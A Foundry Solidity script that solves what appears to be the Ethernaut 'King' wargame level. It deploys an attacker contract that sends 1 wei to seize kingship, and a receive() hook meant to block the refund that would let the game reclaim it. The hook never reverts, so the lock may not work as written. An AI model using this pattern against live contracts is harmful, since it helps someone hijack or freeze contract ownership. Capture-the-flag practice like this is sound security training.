// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import { Script, console } from "forge-std/Script.sol";
import { HelperConfig } from "./HelperConfig.s.sol";
import { King } from "../src/09_King.sol";

contract Attacker {

  address instance;
  constructor (address challengeInstanceAddress) {
    instance = challengeInstanceAddress;
  }

  function attackInstance() public payable {
    (bool success, ) = address(instance).call{value: 1}("");
    require(success, "Call failed");
  }

  function fundContract() external payable {}
  receive() external payable {
    address(instance).call{value: 0}("");
  }
}

contract KingAttacker is Script {

  uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

  function run() external {

    HelperConfig helperConfig = new HelperConfig();
    address payable challengeInstanceAddress = payable(helperConfig.instances("King"));
    King challenge = King(challengeInstanceAddress);    

    vm.startBroadcast(deployerPrivateKey);
    Attacker attacker = new Attacker(challengeInstanceAddress);
    attacker.fundContract{value: 1}();
    attacker.attackInstance();

    console.log("Challenge owner: %s", challenge.owner());

    vm.stopBroadcast();
  }

}